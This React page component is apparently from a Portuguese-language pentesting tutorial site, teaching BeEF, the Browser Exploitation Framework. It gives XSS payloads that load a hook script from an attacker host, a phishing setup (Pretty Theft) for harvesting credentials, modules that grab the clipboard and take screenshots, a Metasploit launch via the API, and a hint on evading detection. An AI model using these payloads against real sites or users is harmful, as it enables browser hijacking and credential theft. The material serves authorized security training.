import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function BeEF() {
    return (
      <PageContainer
        title="BeEF — Browser Exploitation Framework"
        subtitle="Controle navegadores comprometidos via XSS e execute ataques avançados do lado cliente."
        difficulty="avancado"
        timeToRead="12 min"
      >
        <AlertBox type="danger" title="Uso exclusivo em labs autorizados">
          BeEF permite controle total de navegadores. Use exclusivamente em laboratórios controlados,
          com autorização explícita. Uso não autorizado é crime.
        </AlertBox>

        <h2>Instalação e Início</h2>
        <CodeBlock language="bash" code={'# Já instalado no Kali\nbeef-xss --version\n\n# Iniciar o BeEF\nsudo beef-xss\n# ou\ncd /usr/share/beef-xss && sudo ./beef\n\n# Acessar painel de controle\n# Abrir: http://127.0.0.1:3000/ui/panel\n# Login padrão: beef / beef'} />

        <h2>Hooking um Navegador</h2>
        <CodeBlock language="bash" code={'# O hook JavaScript é o coração do BeEF\n# URL do hook: http://SEU_IP:3000/hook.js\n\n# Payload para inserir em site vulnerável a XSS:\n<script src="http://SEU_IP:3000/hook.js"></script>\n\n# Ou como imagem:\n<img src=x onerror="var s=document.createElement(\'script\');s.src=\'http://SEU_IP:3000/hook.js\';document.head.appendChild(s)">\n\n# Payload compacto:\n<script src=//SEU_IP:3000/hook.js></script>'} />

        <h2>Módulos Principais</h2>
        <CodeBlock language="bash" code={'# Após hookar o browser, no painel BeEF:\n# Selecionar o "zombie" (navegador comprometido)\n# Ir em "Commands" e escolher módulos:\n\n# Fingerprinting:\n# - Get Browser Version\n# - Get OS Info\n# - Detect Plugins\n# - Get Screen Size\n\n# Social Engineering:\n# - Pretty Theft (roubar credenciais via popup falso)\n# - Fake Flash Update\n# - Clickjacking\n\n# Network:\n# - Internal Network Fingerprint (mapear rede interna!)\n# - Port Scanner (via navegador)\n\n# Misc:\n# - Get Visited URLs\n# - Get Clipboard\n# - Take Screenshot'} />

        <h2>Pretty Theft — Phishing via BeEF</h2>
        <CodeBlock language="bash" code={'# No painel BeEF:\n# Current Browser → Commands → Social Engineering → Pretty Theft\n\n# Configurar:\n# Dialog Type: Custom (ou Facebook, Google, etc.)\n# Custom Logo: URL de logo da empresa alvo\n# Custom Message: "Sessão expirada, faça login novamente"\n\n# As credenciais digitadas aparecem no painel BeEF'} />

        <h2>Integração com Metasploit</h2>
        <CodeBlock language="bash" code={'# BeEF pode lançar exploits via Metasploit\n\n# 1. No BeEF, ir em: Current Browser → Exploits → Metasploit\n# 2. Configurar IP e porta do msf\n\n# Ou via API do BeEF:\ncurl -H "Content-Type: application/json" \\\n  -d \'{"ZombieID":"ID","CommandName":"MSEI"}\'\n  "http://127.0.0.1:3000/api/bots/ID/commands?token=TOKEN"'} />

        <AlertBox type="warning" title="Detecção">
          BeEF é facilmente detectado por WAFs e ferramentas de segurança modernas.
          Em pentests reais, o hook.js pode precisar ser modificado para evitar detecção.
        </AlertBox>
      </PageContainer>
    );
  }
  